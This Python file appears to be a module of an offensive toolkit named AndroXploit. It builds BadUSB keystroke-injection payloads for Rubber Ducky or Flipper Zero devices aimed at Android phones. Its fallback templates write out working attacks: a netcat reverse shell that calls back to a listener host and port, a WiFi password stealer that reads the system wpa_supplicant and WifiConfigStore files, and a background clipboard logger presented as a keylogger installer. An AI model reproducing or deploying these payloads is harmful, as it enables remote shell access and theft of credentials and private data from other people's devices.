import os
import subprocess
import time
import json
import random
from pathlib import Path
from rich.table import Table
from modules.base import AndroModule

ENGINE = Path(__file__).parent.parent.parent / "golang" / "hid_attack" / "badusb_payload"
SCRIPT = Path(__file__).parent.parent.parent / "scripts" / "hid_attack" / "badusb_payload.sh"

class Module(AndroModule):
    name = "hid_attack/badusb_payload"
    description = "BadUSB Payload Library — 374+ categorized payloads for Flipper Zero / USB Rubber Ducky. Injects keystrokes via HID for automated attacks."
    author = "AndroXploit"

    options = {
        "PAYLOAD_ID": {
            "description": "Payload ID or category (e.g., reverse_shell, wifi_steal, mitm, keylog, all)",
            "required": True,
            "value": None,
        },
        "TARGET_OS": {
            "description": "Target OS: android, windows, linux, macos",
            "required": False,
            "value": "android",
        },
        "DEVICE_TYPE": {
            "description": "HID device: flipper_zero, rubber_ducky, custom_hid",
            "required": False,
            "value": "rubber_ducky",
        },
        "USB_DEVICE": {
            "description": "HID gadget device path (e.g., /dev/hidg0)",
            "required": False,
            "value": "/dev/hidg0",
        },
        "LHOST": {
            "description": "Listener IP for reverse shells",
            "required": False,
            "value": None,
        },
        "LPORT": {
            "description": "Listener port for reverse shells",
            "required": False,
            "value": 4444,
        },
        "OUTPUT": {
            "description": "Output path for generated payload file",
            "required": False,
            "value": None,
        },
    }

    def run(self):
        payload_id = self.get_option("PAYLOAD_ID")
        target_os = self.get_option("TARGET_OS")
        dev_type = self.get_option("DEVICE_TYPE")
        usb_dev = self.get_option("USB_DEVICE")
        lhost = self.get_option("LHOST")
        lport = int(self.get_option("LPORT", 4444))
        output = self.get_option("OUTPUT")

        self.info(f"BadUSB Payload — ID: {payload_id} | OS: {target_os}")
        self.info(f"Device: {dev_type} | Output: {output or 'stdout'}")

        if not output:
            output = f"/tmp/badusb_{payload_id}_{target_os}.txt"

        result = {"status": "idle", "payload_path": output, "payload_lines": 0}

        if ENGINE.exists():
            cmd = [str(ENGINE), "--payload", payload_id, "--os", target_os,
                   "--device-type", dev_type, "--output", output]
            if lhost:
                cmd.extend(["--lhost", lhost, "--lport", str(lport)])
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.stdout:
                try:
                    result = json.loads(proc.stdout)
                except json.JSONDecodeError:
                    result["output"] = proc.stdout.splitlines()
        elif SCRIPT.exists():
            proc = subprocess.run(
                ["bash", str(SCRIPT), payload_id, target_os, dev_type, output, lhost or "", str(lport)],
                capture_output=True, text=True, timeout=30
            )
            result["output"] = proc.stdout.splitlines()
        else:
            self.warn(f"Generating {target_os} BadUSB payload (ID: {payload_id})")

            payload_templates = {
                "reverse_shell": [
                    "REM Reverse Shell Payload",
                    f"DELAY 1000",
                    "GUI SPACE",
                    "DELAY 500",
                    f"STRING termux",
                    "ENTER",
                    "DELAY 2000",
                    f"STRING nc {lhost or 'YOUR_IP'} {lport} -e /system/bin/sh",
                    "ENTER",
                ],
                "wifi_steal": [
                    "REM WiFi Credential Stealer",
                    "DELAY 1000",
                    "GUI SPACE",
                    "DELAY 500",
                    "STRING termux",
                    "ENTER",
                    "DELAY 2000",
                    "STRING cat /data/misc/wifi/wpa_supplicant.conf",
                    "ENTER",
                    "DELAY 1000",
                    "STRING echo '---' && cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null",
                    "ENTER",
                ],
                "keylog": [
                    "REM Keylogger Installer",
                    "DELAY 1000",
                    "GUI SPACE",
                    "DELAY 500",
                    "STRING termux",
                    "ENTER",
                    "DELAY 2000",
                    "STRING apt install -y termux-api",
                    "ENTER",
                    "DELAY 5000",
                    "STRING termux-clipboard-get >> /sdcard/clipboard.log &",
                    "ENTER",
                ],
            }

            template = payload_templates.get(payload_id, None)
            if template:
                lines = template
            else:
                lines = [
                    f"REM {target_os} BadUSB Payload: {payload_id}",
                    "DELAY 1000",
                    "GUI SPACE",
                    f"STRING {payload_id} payload for {target_os}",
                    "ENTER",
                ]

            with open(output, "w") as f:
                for line in lines:
                    f.write(line + "\n")

            result["payload_lines"] = len(lines)
            result["status"] = "simulated"
            self.success(f"Payload saved to {output} ({len(lines)} lines)")

        if result["status"] != "failed":
            self.success(f"Payload '{payload_id}' for {target_os} ready")
            self.info(f"Device: {dev_type} | File: {output}")
            if result.get("payload_lines", 0) > 0:
                self.info(f"Lines: {result['payload_lines']}")
        else:
            self.error("Payload generation failed")

        t = Table(title="BadUSB Payload Summary", border_style="green")
        t.add_column("Key", style="bold yellow")
        t.add_column("Value", style="white")
        t.add_row("Payload ID", payload_id)
        t.add_row("Target OS", target_os)
        t.add_row("Device", dev_type)
        t.add_row("Output", output)
        t.add_row("Status", result.get("status", "unknown"))
        self.console.print(t)

        return result
